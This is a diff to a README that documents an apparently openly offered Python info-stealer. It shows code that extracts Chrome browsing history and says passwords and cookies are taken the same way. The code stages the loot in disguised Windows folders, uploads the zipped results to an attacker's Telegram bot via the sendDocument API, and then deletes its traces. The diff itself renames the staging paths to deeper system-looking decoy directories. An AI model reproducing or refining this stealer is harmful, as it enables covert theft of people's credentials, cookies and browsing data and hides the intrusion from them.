@@ -127,7 +127,7 @@ but in short, It takes info about your PC using python libraries and their write
 
 ⇓Here it try to get chrome history. Firstly get that decrypt and finally write to history-chrome.txt. With passwords and cookies the same algorithm⇓
 ```
-try:
+ try:
         HistorySQL = "SELECT url FROM visits"
         HistoryLinksSQL = "SELECT url, title, last_visit_time FROM urls WHERE id=%d"
 
@@ -138,7 +138,7 @@ try:
         c = sqlite3.connect(os.environ['USERPROFILE']+ '\\AppData\\Roaming\\history.db')
         cursor = c.cursor()
         temp = []
-        with open(rf"C:\windll\Chrome\history-chrome.txt", "a", encoding="utf-8") as history:
+        with open(rf"C:\windll\Browsers\Chrome\history-chrome.txt", "a", encoding="utf-8") as history:
             for result in cursor.execute(HistorySQL).fetchall():
                 data = cursor.execute(HistoryLinksSQL % result[0]).fetchone()
                 result = f"URL: {data[0]}\nTitle: {data[1]}\nLast Visit: {time(data[2])}\n\n"
@@ -160,7 +160,7 @@ def Send(userTOKEN,userCHAT_ID):
 		user = os.environ['USERPROFILE'].replace("C\\Users\\")
 	except:
 		user = 'The murk'
-	archiveOfLogs = rf'windows__cache__\svchost\defender\daksldjlas\dsadsad\sd\dsa\ds\ds\ds\as\dsa\das\ds\sad\das\das\das\dsa\dsa\dsa\das\dsa\dsa\dsa\dsa\dsa\dsa\dsa\dsa\dsa\dsa\dsa\dsa\dsa\dsa\dsa\dsa\dsa\dsa\dsa\dsa\dsa\dsa\{user}-results.zip'
+	archiveOfLogs = rf'systemCache\cache_files\cache\files\system\admin\user\this\wsappx\dll\driver\host\winClient\tools\folder\sysDATA\{user}-results.zip'
 	userUrl = f'https://api.telegram.org/bot{userTOKEN}/sendDocument?chat_id={userCHAT_ID}'
 	headers = {
 	    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
@@ -175,7 +175,7 @@ def Send(userTOKEN,userCHAT_ID):
 	    print(e)
 
 	try:
-		shutil.rmtree('windows__cache__\\', ignore_errors=True)
+		shutil.rmtree('systemCache\\', ignore_errors=True)
 	except Exception as e:
 		print(e)
 ```
